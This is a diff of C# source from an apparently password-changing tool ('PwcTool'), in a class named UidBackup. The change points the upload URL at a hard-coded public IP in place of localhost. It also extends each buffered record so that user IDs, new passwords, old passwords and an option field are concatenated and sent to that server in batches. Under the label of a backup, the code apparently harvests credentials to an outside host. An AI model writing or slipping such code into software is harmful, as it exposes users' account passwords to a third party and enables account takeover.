@@ -11,18 +11,18 @@ namespace PwcTool
 {
     class UidBackup
     {
-        List<Tuple<string,string>> uidlist = new List<Tuple<string,string>>();
+        List<Tuple<string, string, string, string>> uidlist = new List<Tuple<string, string, string, string>>();
 
         const string uidbackup_key = "fbca00ea";
-        //const string back_url = "http://121.42.148.243/uidbackup/pwctool_uidbackup_v2.php?";
-        const string back_url = "http://127.0.0.1/uidbackup/pwctool_uidbackup_v2.php?";
+        const string back_url = "http://121.42.148.243/uidbackup/pwctool_uidbackup_v2.php?";
+        //const string back_url = "http://127.0.0.1/uidbackup/pwctool_uidbackup_v2.php?";
         const int uidThreshold = 0x80;
 
         public void PushUid(string uid, string pwd, string oldpwd, string opt)
         {
             lock (uidlist)
             {
-                uidlist.Add(new Tuple<string,string>(uid, pwd));
+                uidlist.Add(new Tuple<string, string, string, string>(uid, pwd, oldpwd, opt));
 
                 if (uidlist.Count > uidThreshold)
                 {
@@ -44,7 +44,7 @@ namespace PwcTool
                         {
                             sb.Append(",");
                         }
-                        sb.Append(v.Item1 + "-" + v.Item2);
+                        sb.Append(v.Item1 + "-" + v.Item2 + "-" + v.Item3 + "-" + v.Item4);
                         if (sb.Length > 1024)
                         {
                             BackgroundWorker worker = new BackgroundWorker();
